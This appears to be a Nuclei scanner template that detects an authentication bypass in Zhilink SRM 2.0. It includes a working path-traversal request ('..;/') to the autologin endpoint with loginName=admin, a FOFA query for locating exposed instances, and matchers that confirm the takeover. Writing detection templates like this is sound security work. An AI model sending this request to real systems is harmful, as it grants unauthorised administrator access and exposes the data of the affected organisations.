id: zhilink-srm-autologin-unauth
info:
  name: 智联云仓 SRM 2.0 autologin - unauth
  author: leadlife
  severity: high
  description: 由于智联云采 SRM2.0 autologin 接口代码逻辑存在缺陷，导致未授权的攻击者可以构造特殊绕过身份认证直接以管理员身份接管后台，造成信息泄露，使系统处于极不安全的状态。
  reference: 
    - https://github.com/wy876/POC/blob/main/%E6%99%BA%E4%BA%92%E8%81%94%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E6%99%BA%E8%81%94%E4%BA%91%E9%87%87SRM2.0%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3autologin%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: title=="SRM 2.0"
  tags: srm,unauth,zhilink

http:
  - raw:
      - |
        GET /main.bundle.js HTTP/1.1
        Host: {{Hostname}}

      - |+
        GET /adpweb/static/..;/api/sys/app/autologin?loginName=admin HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 302
          - contains(body_1,'api/srm/checkLanguage')
        condition: and